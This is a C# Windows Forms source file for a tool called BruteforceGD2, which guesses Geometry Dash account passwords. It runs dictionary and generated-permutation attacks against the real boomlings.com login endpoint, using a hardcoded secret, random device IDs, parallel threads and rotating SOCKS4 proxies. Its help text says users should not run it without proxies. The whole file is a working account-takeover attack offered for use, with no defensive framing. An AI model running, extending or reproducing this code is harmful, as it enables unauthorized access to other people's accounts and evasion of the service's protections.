using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using GDH.Bruteforce;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using GD2.Bruteforce;

namespace BruteforceGD2
{
    public partial class MainForm : Form
    {
        private Thread attackThread = null;
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        public MainForm()
        {
            InitializeComponent();
        }

        private void Caption_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void btnMin_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void TerminateThread()
        {
            if (attackThread != null)
            {
                if (attackThread.IsAlive)
                    attackThread.Abort();
                attackThread = null;
            }
        }

        private void LoadProxyList()
        {
            List<string> ls = new List<string>();
            foreach (var proxy in lbProxyView.Items)
                ls.Add(proxy.ToString());
            ProxyQueue.UpdateList(ls);
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void btnHelpGenerator_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Enter in the field the letters that will be in the password, also specify the starting and ending length. " +"A wordlist will be generated from all permutations of letters in the sequence.\n" + "Tip: Do not repeat letters twice, this will complicate the algorithm.", "BruteforceGD2", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private void btnBrowseWordlist_Click(object sender, EventArgs e)
        {
            var openFile = new OpenFileDialog();
            if (openFile.ShowDialog() == DialogResult.OK)
                tbWordlist.Text = openFile.FileName;
        }

        private void btnHelpWordlist_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Enter the path to the list of words to check.\n" + "Format: one password per line.", "BruteforceGD2", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private void btnAttackDictionary_Click(object sender, EventArgs e)
        {
            TerminateThread();
            LoadProxyList();
            attackThread = new Thread(() =>
            {
                var result = Bruteforce.DictionaryAttack(tbUsername.Text, File.ReadAllLines(tbWordlist.Text));
                if (result == string.Empty)
                    MessageBox.Show("None of the passwords on this list matched.", "Sorry :'c", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                else
                    MessageBox.Show($"A password for {tbUsername.Text} is \"{result}\"!", "Glorious success <_(',')_>", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            });
            attackThread.Start();
        }

        private void btnGeneratorAttack_Click(object sender, EventArgs e)
        {
            TerminateThread();
            LoadProxyList();
            attackThread = new Thread(() =>
            {
                var result = Bruteforce.GeneratorAttack(tbUsername.Text, tbCharset.Text.ToArray(), (int)nudStart.Value, (int)nudLimit.Value);
                if (result == string.Empty)
                    MessageBox.Show("None of the generated passwords matched.", "Sorry :'c", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                else
                    MessageBox.Show($"A password for {tbUsername.Text} is \"{result}\"!", "Glorious success <_(',')_>", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            });
            attackThread.Start();
        }

        private void btnAddProxyManually_Click(object sender, EventArgs e)
        {
            lbProxyView.Items.Add(tbProxyUrl.Text);
        }

        private void btnProxyShuffle_Click(object sender, EventArgs e)
        {
            ListBox.ObjectCollection list = lbProxyView.Items;
            Random rng = new Random();
            int n = list.Count;
            lbProxyView.BeginUpdate();
            while (n > 1)
            {
                n--;
                int k = rng.Next(n + 1);
                object value = list[k];
                list[k] = list[n];
                list[n] = value;
            }
            lbProxyView.EndUpdate();
            lbProxyView.Invalidate();
        }

        private void btnClearProxyList_Click(object sender, EventArgs e)
        {
            lbProxyView.Items.Clear();
        }

        private void btnImportProxyList_Click(object sender, EventArgs e)
        {
            var proxyList = File.ReadAllLines(tbProxyListPath.Text);
            foreach (var proxyLine in proxyList)
                lbProxyView.Items.Add(proxyLine);
        }

        private void btnHelpProxyList_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Well, you will not use this program without a proxy (I hope). Proxy list format: one proxy per line. ONLY SOCKS4 PROXIES are accepted (yet).\n" +"Example: 127.0.0.1:8080", "BruteforceGD2", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        private void btnBrowseProxyList_Click(object sender, EventArgs e)
        {
            var openFile = new OpenFileDialog();
            if (openFile.ShowDialog() == DialogResult.OK)
                tbProxyListPath.Text = openFile.FileName;
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            Console.WriteLine("Welcome to BruteforceGD2!");
        }
    }
}
namespace GDH.Bruteforce
{
    public static class Bruteforce
    {
        private static Random random = new Random();

        private static string GenerateUDID() => "S" + new string(Enumerable.Repeat("1234567890", 37).Select(s => s[random.Next(s.Length)]).ToArray());

        public static bool Check(string username, string password)
        {
            while (true)
            {
                ProxyClient client = ProxyQueue.NextProxy();

                Console.WriteLine($"Checking {password} for {username} using {(client == null ? "no proxy" : $"proxy {client}")}.");
                using (var request = new HttpRequest())
                {
                    request.Proxy = client;
                    if (request.Proxy != null)
                        request.Proxy.ConnectTimeout = 6000;

                    try
                    {
                        string response = request.Post("http://www.boomlings.com/database/accounts/loginGJAccount.php", $"udid={GenerateUDID()}&userName={username}&password={password}&secret=Wmfv3899gc9", "application/x-www-form-urlencoded").ToString();
                        if (response.StartsWith("-"))
                            return false;
                        return true;
                    }
                    catch (Exception ex) { Console.WriteLine($"Failed with proxy {client} ({(int)request.Response.StatusCode}), retrying with another one..."); }
                }
            }
        }

        public static IEnumerable<string> Permutations(char[] chars, int length)
        {
            if (length <= 0) yield break;
            foreach (var a in chars)
            {
                yield return a.ToString();
                foreach (var b in Permutations(chars, length - 1)) yield return a + b;
            }
        }

        public static string DictionaryAttack(string username, IEnumerable<string> wordlist)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            ParallelOptions po = new ParallelOptions();
            po.CancellationToken = cts.Token;
            po.MaxDegreeOfParallelism = Environment.ProcessorCount;

            string password = string.Empty;

            try
            {
                Parallel.ForEach(wordlist, po, (word, loopState) =>
                {
                    if (Check(username, word))
                    {
                        password = word;
                        cts.Cancel();
                    }
                });
            }
            catch (OperationCanceledException) { Console.WriteLine($"Password is \"{password}\"!"); }

            return password;
        }

        public static string GeneratorAttack(string username, char[] chars, int lengthMin, int lengthMax) => DictionaryAttack(username, Permutations(chars, lengthMax).Where(item => item.Length >= lengthMin));
    }
}
